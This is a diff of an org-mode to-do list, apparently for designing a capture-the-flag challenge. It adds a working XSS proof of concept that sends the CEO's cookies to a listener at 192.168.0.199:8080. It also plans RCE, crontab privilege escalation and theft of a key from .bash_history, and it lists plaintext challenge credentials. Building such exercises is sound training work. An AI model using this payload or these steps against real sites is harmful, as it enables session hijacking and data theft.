@@ -57,9 +57,9 @@ One of the ways to get to the intranet
    CSG_SomeThingsAreStrange
 *** SQL login → logging:JF8KI4iYQWNbjWtn
 
-** DONE Login as the CEO
+** DONE Steal the CEO's cookies
    CLOSED: [2017-03-01 Wed 23:14]
-*** Need PoC
+*** PoC
     <img id=f src=x /><script>var elem=document.getElementById('f');elem.src="http://192.168.0.199:8080/"+document.cookie;</script>
 ** In Process Extract the banking info from /home/sysadmin/banking.txt.pgp
    From a RCE, proceed to privilege escalate and extract the key from .bash_history
@@ -82,7 +82,9 @@ One of the ways to get to the intranet
    CLOSED: [2017-02-25 Sat 01:10]
 ** DONE Implement a messaging system
    CLOSED: [2017-02-25 Sat 18:11]
-** Implement a XSS bot for the CEO's account
+** DONE Implement a XSS bot for the CEO's account
+   CLOSED: [2017-03-08 Wed 00:16]
+   See ./src/wtiiaas/scripts/xss.js
 ** WONTFIX Make the instructions HTML
 ** Privilege escalation from RCE
    Bash crontab running as sysadmin, banking file is owned by sysadmin
@@ -95,6 +97,9 @@ One of the ways to get to the intranet
    CLOSED: [2017-03-02 Thu 00:47]
 ** TODO Fix Dockerfile
 ** TODO Modify root password from ENV variable that will be set when container is RUN
+* Notes
+** PhantomJS
+   Jane Harden jane.harden@wtiiaas.csg : SupeReLitePassWerd12--@@ : 5d3ee89d46ec1c979f63dc8d780841e6
 * Instructions
 Camarades, l'heure est grave. Les écrits du camarade Mao s'avèrent véridique: l'impérialisme de l'Ouest prend notre patrie en otage! Voilà pourquoi nous avons créés une unité super-méga-secrète qui nous permettera de partir en cyber-guerre contre ces américains assoiffés de profit! Ces jeunes programmeurs milliardaires de 20 ans causent un embarras incomensurable à la patrie, nous nous devons de lutter!
 
